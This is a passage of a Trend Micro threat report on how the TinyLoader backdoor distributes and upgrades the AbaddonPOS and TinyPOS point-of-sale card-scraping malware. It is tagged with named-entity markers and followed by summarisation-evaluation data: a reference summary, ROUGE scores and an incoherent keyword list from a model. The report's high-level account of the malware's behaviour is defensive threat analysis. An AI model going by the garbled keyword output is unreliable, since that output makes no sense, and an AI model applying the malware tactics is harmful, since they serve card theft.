[DATE] of [DATE] this [DATE] year , we started seeing similar detections on % PROGRAMDATA% stemming from TinyLoader . However , it used a different file name\u2014conhost.exe . Our analysis shows that this is still AbaddonPOS with very slight modifications . It uses now the mutex , file names , scheduler.exe and conhost.exe . The said binary was downloaded on the same site hosting AbaddonPOS . This binary , which we dubbed as updater component , was distributed5Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS Threatsaround [DATE] February 29 , [DATE] 2016 , [DATE] a [DATE] month after the initial wave . The file \u2019s logic was quite simple : Figure [CARDINAL] 4 . The update component enumerates running processes and checks for familiar filenames in All [ORG] User 's application data folder . It then terminates these if found . Aside from % ProgramData%\\scheduler.exe , the updater component looks for another file , conhost.exe in the same directory , which seemed unusual . However , this made sense when AbaddonPOS was deployed with the file name , % PROGRAMDATA% \\conhost.exe [DATE] last [DATE] March [DATE] 2016 . TinyLoader was preparing to upgrade the existing installations of the said PoS malware . We saw that TinyLoader not only distributed AbaddonPOS but also managed the upgrades of this PoS threat.6Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and [ORG] Upgrades [ORG] PoS [ORG] ThreatsTies that Bind : The TinyPOS - AbaddonPOS Connection When a new PoS malware strain , TinyPOS emerged in threat landscape , we checked its connection to AbaddonPOS . Since TinyPOS is hosted on the same server as AbaddonPOS ( see diagram below ) , it prompted us to dig deeper into these threats . We were able to identify that [ORG] TinyLoader was distributing both PoS threats . Figure [CARDINAL] 5 . Mapping of file sources and [ORG] C&C serversIn addition , we also saw the updater component that cleans up process names used by AbaddonPOS ( scheduler.exe and conhost.exe ) and TinyPOS ( wmi_service.exe).7Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure 6 . New updater component logicLast [DATE] April [DATE] 2016 , TinyPOS started sporting tactics commonly associated with PoS RAM scraper . PoS [ORG] RAM scrapers usually look for process names either for exclusion ( similar to what AbaddonPOS did ) or for targeting . Targeting is a selective method of seeking out a known TinyPOS used a particular binary in memory : resdbs.exe . This binary otherwise known as MICROS \u00ae [ORG] Database [ORG] Service is part of several MICROS \u00ae software solutions . Various industries like retail typically use these software solutions . TinyPOS scans all other processes not included in the whitelist . It also creates a separate thread that only monitors the [PERSON] Micros service . With this dedicated thread , this malware increases its chances of capturing credit card information from the resdbs.exe process memory . Figure [CARDINAL] 7 . TinyPOS creates a separate thread dedicated to resdbs.exe monitoring . It is also worth noting that AbaddonPOS also has a separate thread for monitoring specific processes . However , our samples show that its list is blank . The only difference between TinyPOS and AbaddonPOS in this particular context is the coding approach . It seems that TinyPOS is a simplified version of AbbadonPOS.9Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsFigure 8 . AbaddonPOS coding approachTargeting PoS software components are very common . MalumPOS and RawPOS are some examples of PoS threats that employed the same technique . Both TinyPOS and AbaddonPOS modified the process list to match the target environment \u2019s point - of - sale software , similar to what RawPOS did . We looked at how newer versions of AbaddonPOS were distributed and found that the initial versions of TinyPOS were distributed the same way . AbaddonPOS were tested [ORDINAL] first via selective deployment and only when these deployments were proven successful will they only go for wide distribution . We have yet to see a mass deployment of TinyPOS but we \u2019re already seeing infections within [GPE] the [GPE] United [GPE] States and some parts of Europe.10Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsWidespread Distribution Through our research , we established that AbaddonPOS and TinyPOS are one and the same PoS family . They cast a wide net to hit as many environments as possible and to prepare that environment for secondary infections . This tactic is reminiscent of another PoS threat , GamaPOS.The combined infections of AbaddonPOS and TinyPOS have struck various industries:\u2022 [LAW] Technology\u2022 [LAW] Healthcare\u2022 [ORG] Transportation\u2022 Education\u2022 Manufacturing\u2022 Fast - Moving Consumer Goods ( FMCG)\u2022 GovernmentThis list of affected industries seems extensive but not surprising , particularly in [GPE] the [GPE] United [GPE] States . According to a survey released by [ORG] the [ORG] Strawhecker [ORG] Group ( TSG ) , [PERCENT] only 37 % of [GPE] US merchant locations are [ORG] EMV - ready after the [DATE] October [DATE] 1 , [DATE] 2015 liability shift . The same survey also revealed that the implementation has been slower than expected . The estimated adoption rate should be [PERCENT] at [PERCENT] least 90 % by [CARDINAL] 2017.As merchants tried to catch up to [ORG] EMV implementation , attackers are already showing a keen interest at other verticals to hit before higher adoption takes place . They ( attackers ) are using their malicious tools to infect as many PoS systems as possible before point - to - point encryption will be fully adopted . When the card data is not encrypted in the reader , this makes a terminal even with Chip - and- [PERSON] Pin susceptible to PoS [ORG] RAM scraper malware . A non - [ORG] EMV enabled terminal also allows anyone who has duplicated card data ( card - in - hand ) to walk in an establishment and use that duplicated card . He / she can also place an online transaction where details such as the [CARDINAL] three - digit security code and billing address are not verified.11Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsChallenges and Recommendations On their own , a backdoor and a point - of - sale ( PoS ) malware can pose great threats to enterprises and small and medium - sized businesses ( SMBs ) . As a tandem , these [CARDINAL] two can lead to stealthier and more flexible attacks . The use of TinyLoader with a PoS threat is quite effective . Its multicomponent architecture allows several small modules to be built depending on the need . This makes attacks less noticeable , thus avoiding detection . The small modules also enable the secondary infection to be successful . The command - and - control ( [ORG] C&C ) server of [ORG] TinyLoader needs not to be a server where it gets the components . It can be directed to connect to another site for downloading the component . The downloaded component ( secondary malware ) can then report to its own [ORG] C&C server . As detailed above , [ORG] TinyLoader was used like a software management suite to manage the deployment and upgrade of both AbaddonPOS / TinyPOS . Analyzing these samples individually would not lead to any conclusion . Acquiring only the [ORG] TinyLoader executable absolutely made no sense because one has to observe how other components are being used . This presents challenges in both static and dynamic analysis . In static analysis of [ORG] TinyLoader , only a [ORG] TCP socket connection to a pre - defined [ORG] IP address and port is visible . In dynamic analysis ( where most sandboxes can only run the sample for [TIME] a [TIME] few [TIME] minutes ) , a similar raw socket connection is also seen . This means that only through actual infection can one observe the complete infection chain \u2014 from launching tools and gathering information on the system to secondary infection . The businesses affected by this combined backdoor and point - of - sale threat were spread out between single seat infections and SMBs . TinyLoader used a high numbered port to communicate back to its own [ORG] C&C server while being able to introduce additional files in the environment via HTTP requests . This spells the importance of looking into outbound requests ( or traffic leaving the environment ) aside from the common practice of restricting inbound and outbound requests to certain known services . [ORG] Trend [ORG] Micro protects customers from all threats related to [ORG] TinyLoader . To protect enterprises from malware with PoS [ORG] RAM - scraping capabilities , it is best to employ endpoint application control that reduces attack exposure by ensuring only updates associated with whitelisted applications can be installed . Endpoint solutions such as [ORG] Trend [ORG] Micro \u2122 [ORG] Security , [ORG] Trend [ORG] Micro \u2122 Smart Protection Suites , and [ORG] Trend [ORG] Micro Worry - Free \u2122 [ORG] Business [ORG] Security can protect users systems from AbaddonPOS , TinyPOS , and TinyLoader backdoor by detecting these malicious files . While [ORG] Trend [ORG] Micro detects all indicators that were discussed here , we still are monitoring the progression of this threat.12Trend Micro | Backdoor as a Software Suite : How TinyLoader Distributes and Upgrades PoS ThreatsAppendix : Example Indicators of Compromise TinyPOSTinyLoader screen grabber [ORG] Tiny [ORG] Loader process enumerator [ORG] TinyLoader [ORG] Update module for world safe for exchanging digital information . Our innovative solutions for consumers , businesses and governments provide layered content security to protect information on mobile devices , endpoints , gateways , servers and the cloud . All of our solutions are powered by cloud - based global threat intelligence , the Trend Micro \u2122 Smart Protection Network \u2122 , and are supported by [CARDINAL] over [CARDINAL] 1,200 threat experts around the globe . For more information , visit www.trendmicro.com.t - balllogo are \u00a9 [DATE] 2016 by [ORG] Trend [ORG] Micro , Incorporated . All rights reserved . [ORG] Trend [ORG] Micro and the [ORG] Trend [ORG] Micro trademarks of [ORG] Trend [ORG] Micro , Incorporated . All other product or company names may be trademarks or registered trademarks of their owners.trademarks or [PERSON] registered10101 [PERSON] N. [PERSON] De [PERSON] Anza [PERSON] Blvd . [GPE] Cupertino , CA [CARDINAL] 95014U.S. toll free : 1 +800.228.5651 Phone : [CARDINAL] 1 +408.257.1500 Fax : [QUANTITY] 1 [QUANTITY] +408.257.2003", "generated_text": "the report; Trend Micro; TinyLoader; AbaddonPOS; AbaddonPOS variants; access; traffic; control; the backdoor; the AbaddonPOS backdoor; the upgrades; the malware; a software suite; a backdoor; the TinyPOS-AbaddonPOS connection; the operators; this attack; PoS malware; the primary backdoor; the backdoor; sandboxing; a command; control; data; the upgrade; the Recommendations; alerts; the attackers; tools; the registry; a new version; a new version; tools; a new process; the update; a new version; the access; a new interface; security; the update; the scripts; a new system; changes; the status; the security software; the backdoor; updates; the time; each update; the server; the update; the infrastructure; the network; the protocol; a solution; a solution; NETWORK; a network; a solution; the use; the PoS malware; messages; backups; the ties; the attackers; the tactics; the configuration; the", "ref_text": "<START-1>The report by Trend Micro examines the connection between the TinyLoader backdoor and two point-of-sale (PoS) malware threats - AbaddonPOS and TinyPOS. It found that TinyLoader is being used to distribute and manage upgrades for both AbaddonPOS and TinyPOS, indicating the operators behind the two PoS malwares are likely the same. The main findings are: - TinyLoader is a backdoor that can introduce secondary infections into an environment after doing reconnaissance using small components. It was initially linked to AbaddonPOS in late 2015. - Two waves of AbaddonPOS infections were observed in early 2016, first targeting North America then Europe. The malware was distributed via TinyLoader. - An \"updater component\" was later distributed to replace older AbaddonPOS filenames with a new version. - In early 2016, a new PoS threat called TinyPOS emerged, also distributed by TinyLoader. It shares code similarities with AbaddonPOS. - TinyPOS showed new capabilities to target specific PoS software processes, indicating it is likely an upgraded version of AbaddonPOS. - The infections targeted a wide range of industries globally. This is likely due to the slow adoption of EMV standards making PoS systems vulnerable. - The use of TinyLoader allows stealthy distribution and management of PoS malware. Its components make analysis and detection challenging. The report highlights the need for tracking outbound network traffic for signs of compromise, and using application control to block untrusted programs. Trend Micro continues to monitor this threat's evolution. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4074074074074074, "gpt3/lexical/rouge_rouge2": 0.17391304347826086, "gpt3/lexical/rouge_rougeL": 0.29012345679012347, "gpt3/lexical/rouge_rougeLsum": 0.29012345679012347, "gpt3_generated_text": ["This article from Trend Micro discusses the connection between the backdoor malware TinyLoader and two point-of-sale (PoS) threats, AbaddonPOS and TinyPOS. The analysis reveals that TinyLoader is used to distribute and manage the upgrades of AbaddonPOS, as well as spread TinyPOS variants. This suggests that the operators behind these threats are the same. The article provides information on the distribution of TinyLoader infections and explains how TinyLoader operates as a backdoor to introduce secondary infections. It also discusses the challenges and recommendations for dealing with this type of attack."]}]